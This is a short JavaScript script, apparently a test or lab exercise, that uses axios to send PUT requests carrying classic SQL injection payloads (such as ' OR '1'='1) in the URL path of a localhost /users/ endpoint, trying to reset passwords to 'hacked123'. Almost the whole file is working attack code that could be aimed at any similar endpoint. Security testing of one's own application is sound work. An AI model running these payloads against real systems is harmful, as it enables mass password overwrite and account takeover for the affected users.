import axios from 'axios';

// Target base URL
const baseURL = 'http://localhost:5000/users/';

// SQL injection test payloads
const payloads = [
  "' OR '1'='1",
  "' OR '1'='1' --",
  "' OR 'a'='a"
];

// The new password you want to inject
const newPassword = 'hacked123';

async function testSqlInjection() {
  for (const payload of payloads) {
    const encodedPayload = encodeURIComponent(payload);
    const targetURL = baseURL + encodedPayload;

    console.log(`\nTesting payload: ${payload}`);
    try {
      const response = await axios.put(targetURL, {
        newPass: newPassword
      }, {
        headers: {
          'Content-Type': 'application/json'
        }
      });

      console.log(`Status Code: ${response.status}`);
      console.log(`Response Body:\n${JSON.stringify(response.data, null, 2)}`);
    } catch (error) {
      if (error.response) {
        console.error(`Status Code: ${error.response.status}`);
        console.error(`Response Body:\n${JSON.stringify(error.response.data, null, 2)}`);
      } else {
        console.error(`Request failed: ${error.message}`);
      }
    }
  }
}

// 👇 This was likely missing
testSqlInjection();
